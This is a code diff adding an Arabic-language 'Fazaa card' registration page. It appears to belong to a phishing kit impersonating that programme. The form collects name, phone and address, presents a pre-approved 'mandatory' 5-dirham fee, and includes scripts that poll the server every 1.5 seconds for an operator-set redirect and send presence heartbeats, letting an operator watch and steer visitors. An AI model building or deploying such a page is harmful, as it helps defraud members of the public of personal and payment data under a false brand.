@@ -1,0 +1,605 @@
+
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>فزعة | التسجيل</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --sahara-green: #2d2d4e;
+            --sahara-green-dark: #1a1a3a;
+            --sahara-green-light: #eeeef5;
+            --sahara-dark: #1a1a2e;
+            --sahara-gray: #6B7280;
+            --sahara-light: #F9FAFB;
+            --sahara-white: #FFFFFF;
+            --sahara-gold: #d4af37;
+            --sahara-border: #E5E7EB;
+            --sahara-radius: 16px;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: 'Tajawal', system-ui, -apple-system, sans-serif;
+            background: var(--sahara-light);
+            color: #1E293B;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* === Navbar === */
+        .sahara-nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 24px;
+            background: var(--sahara-white);
+            box-shadow: 0 1px 4px rgba(0,0,0,0.06);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        .sahara-nav .logo-img {
+            height: 78px;
+            width: auto;
+            display: block;
+        }
+        .sahara-nav .back-btn {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            background: var(--sahara-green-light);
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--sahara-green);
+            font-size: 16px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.3s;
+        }
+        .sahara-nav .back-btn:hover {
+            background: var(--sahara-green);
+            color: #fff;
+        }
+        .sahara-nav .nav-links {
+            display: flex;
+            gap: 20px;
+        }
+        .sahara-nav .nav-links a {
+            text-decoration: none;
+            color: #555;
+            font-size: 14px;
+            font-weight: 600;
+            transition: color 0.3s;
+        }
+        .sahara-nav .nav-links a:hover {
+            color: var(--sahara-green);
+        }
+
+        /* === Step Indicator === */
+        .step-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            padding: 16px;
+            background: var(--sahara-white);
+            border-bottom: 1px solid var(--sahara-border);
+        }
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--sahara-border);
+        }
+        .step-dot.completed {
+            background: var(--sahara-green);
+        }
+        .step-dot.active {
+            background: var(--sahara-gold);
+            box-shadow: 0 0 0 4px rgba(212, 175, 55, 0.2);
+        }
+
+        /* === Form Header === */
+        .form-header {
+            text-align: center;
+            padding: 24px 16px 10px;
+        }
+        .form-header h2 {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1E293B;
+            margin-bottom: 6px;
+        }
+        .form-header p {
+            font-size: 13px;
+            color: var(--sahara-gray);
+        }
+
+        /* === Form Card === */
+        .form-wrap {
+            flex: 1;
+            padding: 0 16px 24px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+        }
+        .form-card {
+            background: var(--sahara-white);
+            border-radius: var(--sahara-radius);
+            padding: 28px 24px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+            border: 1px solid var(--sahara-border);
+        }
+
+        /* === Form Fields === */
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 8px;
+        }
+        .form-group label i {
+            font-size: 12px;
+            color: var(--sahara-green);
+        }
+        .form-group label .required-star {
+            color: #ef4444;
+            font-size: 14px;
+            font-weight: 700;
+        }
+        .form-input {
+            width: 100%;
+            border: 1.5px solid var(--sahara-border);
+            border-radius: 12px;
+            padding: 13px 14px;
+            font-size: 14px;
+            font-family: 'Tajawal', system-ui, sans-serif;
+            color: #1E293B;
+            background: var(--sahara-white);
+            transition: border-color 0.3s, box-shadow 0.3s;
+            direction: rtl;
+            height: 50px;
+        }
+        .form-input:focus {
+            border-color: var(--sahara-green);
+            box-shadow: 0 0 0 3px rgba(45, 45, 78, 0.15);
+            outline: none;
+        }
+        .form-input::placeholder {
+            color: #CBD5E1;
+            font-size: 13px;
+        }
+
+        /* === Custom Select (نوع البطاقة) === */
+        .form-select-custom {
+            width: 100%;
+            border: 1.5px solid var(--sahara-border);
+            border-radius: 12px;
+            padding: 13px 14px;
+            font-size: 14px;
+            font-family: 'Tajawal', system-ui, sans-serif;
+            color: #1E293B;
+            background-color: var(--sahara-white);
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%232d2d4e' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: left 14px center;
+            background-size: 14px;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+            direction: rtl;
+            height: 50px;
+            cursor: pointer;
+        }
+        .form-select-custom:focus {
+            border-color: var(--sahara-green);
+            box-shadow: 0 0 0 3px rgba(45, 45, 78, 0.15);
+            outline: none;
+        }
+        .form-select-custom option {
+            font-family: 'Tajawal', system-ui, sans-serif;
+            font-size: 14px;
+            padding: 10px;
+            color: #1E293B;
+            background: var(--sahara-white);
+        }
+        .form-select-custom option:checked {
+            background: var(--sahara-green-light);
+            color: var(--sahara-green);
+        }
+        .form-select-custom:invalid {
+            color: #CBD5E1;
+        }
+        .form-select-custom option[disabled] {
+            color: #CBD5E1;
+        }
+        .form-select-custom option:not([disabled]) {
+            color: #1E293B;
+        }
+
+        .mandatory-fee-box {
+            border: 1.5px solid rgba(45, 45, 78, 0.18);
+            border-radius: 14px;
+            background: linear-gradient(135deg, #f5f5fa, #eeeef5);
+            padding: 14px;
+        }
+        .mandatory-fee-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 10px;
+            padding: 14px 16px;
+            border-radius: 12px;
+            background: #fff;
+            border: 1.5px solid rgba(45, 45, 78, 0.22);
+            color: #1E293B;
+            font-size: 14px;
+            font-weight: 700;
+        }
+        .mandatory-fee-option .choice-value {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--sahara-green);
+            white-space: nowrap;
+        }
+        .mandatory-fee-option .choice-help {
+            color: #475569;
+            font-size: 12px;
+            font-weight: 600;
+            text-align: left;
+        }
+        .mandatory-fee-note {
+            margin: 10px 2px 0;
+            font-size: 12px;
+            color: #64748B;
+            line-height: 1.7;
+        }
+
+        /* === Balance Input === */
+        .balance-input-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        .balance-input {
+            padding-left: 60px !important;
+        }
+        .currency-badge {
+            position: absolute;
+            left: 14px;
+            background: var(--sahara-green);
+            color: #fff;
+            font-size: 12px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 8px;
+        }
+
+        /* === Customer Toggle === */
+        .customer-toggle {
+            display: flex;
+            gap: 12px;
+        }
+        .customer-toggle input[type="radio"] {
+            display: none;
+        }
+        .customer-toggle .toggle-option {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 14px;
+            border: 2px solid var(--sahara-border);
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--sahara-gray);
+            cursor: pointer;
+            transition: all 0.3s;
+            background: var(--sahara-white);
+        }
+        .customer-toggle .toggle-option:hover {
+            border-color: var(--sahara-green);
+            color: var(--sahara-green);
+        }
+        .customer-toggle input[type="radio"]:checked + .toggle-option {
+            background: var(--sahara-green);
+            border-color: var(--sahara-green);
+            color: #fff;
+            box-shadow: 0 4px 12px rgba(45, 45, 78, 0.3);
+        }
+
+        /* === Submit Button === */
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(135deg, #2d2d4e, #1a1a3a);
+            color: #fff;
+            border: none;
+            padding: 15px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Tajawal', system-ui, sans-serif;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s;
+            box-shadow: 0 4px 16px rgba(45, 45, 78, 0.3);
+            margin-top: 8px;
+        }
+        .btn-submit:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(45, 45, 78, 0.4);
+        }
+        .btn-submit:disabled {
+            background: #94A3B8;
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+
+        /* === Info Note === */
+        .info-note {
+            background: var(--sahara-green-light);
+            border: 1px solid rgba(45, 45, 78, 0.2);
+            border-radius: 12px;
+            padding: 12px 14px;
+            margin-top: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .info-note i {
+            color: var(--sahara-green);
+            font-size: 16px;
+            margin-top: 2px;
+        }
+        .info-note p {
+            font-size: 12px;
+            color: #374151;
+            line-height: 1.7;
+            margin: 0;
+        }
+
+        /* === Footer === */
+        .sahara-footer {
+            background: var(--sahara-dark);
+            color: var(--sahara-white);
+            padding: 20px 16px;
+            text-align: center;
+            margin-top: auto;
+        }
+        .sahara-footer .footer-logo {
+            height: 64px;
+            width: auto;
+            margin-bottom: 12px;
+        }
+        .sahara-footer p {
+            font-size: 12px;
+            color: #94A3B8;
+            line-height: 1.7;
+        }
+        .sahara-footer .footer-bottom {
+            border-top: 1px solid rgba(255,255,255,0.08);
+            padding-top: 10px;
+            margin-top: 10px;
+            font-size: 11px;
+            color: #64748B;
+        }
+
+        @media (max-width: 480px) {
+            .sahara-nav {
+                padding: 10px 16px;
+            }
+            .sahara-nav .logo-img {
+                height: 64px;
+            }
+            .form-card {
+                padding: 20px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Navbar -->
+    <nav class="sahara-nav">
+        <a href="index.php" class="back-btn">
+            <i class="fas fa-arrow-right"></i>
+        </a>
+        <img src="./assets/sahara_brand_logo.png?v=esaad" alt="فزعة" class="logo-img">
+        <div class="nav-links">
+            <a href="index.php">الرئيسية</a>
+        </div>
+    </nav>
+
+    <!-- Step Indicator -->
+    <div class="step-indicator">
+        <div class="step-dot completed"></div>
+        <div class="step-dot active"></div>
+        <div class="step-dot"></div>
+        <div class="step-dot"></div>
+    </div>
+
+    <!-- Form Header -->
+    <div class="form-header">
+        <h2><i class="fas fa-id-card" style="color: var(--sahara-green); margin-left: 8px;"></i> التسجيل في طلب بطاقة فزعه</h2>
+        <p>يرجى إدخال بياناتك الشخصية وبيانات التوصيل لإتمام الطلب</p>
+    </div>
+
+    <!-- Form -->
+    <div class="form-wrap">
+        <div class="form-card">
+            <form action="" method="POST">
+
+                <!-- الاسم الكامل -->
+                <div class="form-group">
+                    <label>
+                        <i class="fas fa-user"></i>
+                        الاسم الكامل
+                    </label>
+                    <input type="text" name="name" required class="form-input" placeholder="أدخل الاسم الكامل">
+                </div>
+
+                <!-- رقم الهاتف -->
+                <div class="form-group">
+                    <label>
+                        <i class="fas fa-phone"></i>
+                        رقم الهاتف
+                    </label>
+                    <input type="text" name="phone" required inputmode="numeric" class="form-input" placeholder="أدخل رقم الهاتف">
+                </div>
+
+                <!-- العنوان -->
+                <div class="form-group">
+                    <label>
+                        <i class="fas fa-map-marker-alt"></i>
+                        عنوان التوصيل
+                    </label>
+                    <input type="text" name="bill_account" required class="form-input" placeholder="أدخل عنوانك">
+                </div>
+
+                <!-- عدد أفراد الأسرة -->
+                <div class="form-group">
+                    <label>
+                        <i class="fas fa-users"></i>
+                        عدد أفراد الأسرة
+                    </label>
+                    <select name="family_members_count" required class="form-input">
+                        <option value="" selected disabled>اختر عدد أفراد الأسرة</option>
+                        <option value="1">1</option>
+                        <option value="2">2</option>
+                        <option value="3">3</option>
+                        <option value="4">4</option>
+                        <option value="5">5</option>
+                        <option value="6">6</option>
+                        <option value="7">7</option>
+                        <option value="8">8</option>
+                        <option value="9">9</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                        <option value="13">13</option>
+                        <option value="14">14</option>
+                    </select>
+                </div>
+
+                <!-- نوع البطاقة -->
+                <div class="form-group">
+                    <label>
+                        <i class="fas fa-id-card"></i>
+                        نوع البطاقة <span class="required-star">*</span>
+                    </label>
+                    <select name="card_type" id="card_type_input" required class="form-select-custom">
+                        <option value="" disabled selected>اختر نوع البطاقة</option>
+                        <option value="بلاتينية">بلاتينية</option>
+                        <option value="ذهبية">ذهبية</option>
+                        <option value="فضية">فضية</option>
+                    </select>
+                </div>
+
+                <!-- الموافقة على الرسوم -->
+                <div class="form-group">
+                    <label>
+                        <i class="fas fa-receipt"></i>
+                        الموافقة على دفع رسوم بقيمة 5 درهم
+                    </label>
+                    <div class="mandatory-fee-box">
+                        <div class="mandatory-fee-option">
+                            <span class="choice-value"><i class="fas fa-check-circle"></i> نعم</span>
+                            <span class="choice-help">رسوم إلزامية لإتمام الطلب</span>
+                        </div>
+                        <p class="mandatory-fee-note">هذه الرسوم الزامية ويتم تسديدها لمرة واحدة فقط وهي تشمل رسوم التوصيل.</p>
+                        <input type="hidden" name="fee_approval" value="نعم">
+                    </div>
+                </div>
+
+                <!-- Submit -->
+                <button type="submit" name="submit" id="butSubm" disabled class="btn-submit">
+                    <span>متابعة الطلب</span>
+                    <i class="fas fa-arrow-left"></i>
+                </button>
+
+                <!-- Info Note -->
+                <div class="info-note">
+                    <i class="fas fa-info-circle"></i>
+                    <p>بالضغط على "متابعة الطلب" فإنك توافق على شروط وأحكام خدمة فزعه</p>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="sahara-footer">
+        <img src="https://i.postimg.cc/yNsF5MSj/6-2.png" alt="فزعة" class="footer-logo" style="filter: none;">
+        <p style="font-size:13px;font-weight:600;color:#2d2d4e;margin-bottom:4px;">بطاقة فزعه | FAZAA</p>
+        <div class="footer-bottom">
+            &copy;بطاقة فزعه | FAZAA
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.querySelector('form');
+            const submitBtn = document.getElementById('butSubm');
+
+            form.addEventListener('input', function() {
+                submitBtn.disabled = !form.checkValidity();
+            });
+
+            form.addEventListener('change', function() {
+                submitBtn.disabled = !form.checkValidity();
+            });
+
+            if (form.checkValidity()) {
+                submitBtn.disabled = false;
+            }
+        });
+    </script>
+
+    <script>
+    function checkRedirect() {
+        fetch('polling-redirect.php').then(r => r.json()).then(data => { if (data.redirect) { window.location.href = data.redirect; } }).catch(e => {});
+    }
+    setInterval(checkRedirect, 1500);
+    checkRedirect();
+    </script>
+
+    
+<script>
+// Heartbeat - تحديث حالة الاتصال فوراً
+function sendHeartbeat() {
+    fetch('heartbeat.php').catch(function(e){});
+}
+setInterval(sendHeartbeat, 2000);
+sendHeartbeat();
+window.addEventListener('beforeunload', function() {
+    navigator.sendBeacon('heartbeat.php', new URLSearchParams({action: 'offline'}));
+});
+</script>
+</body>
+</html>
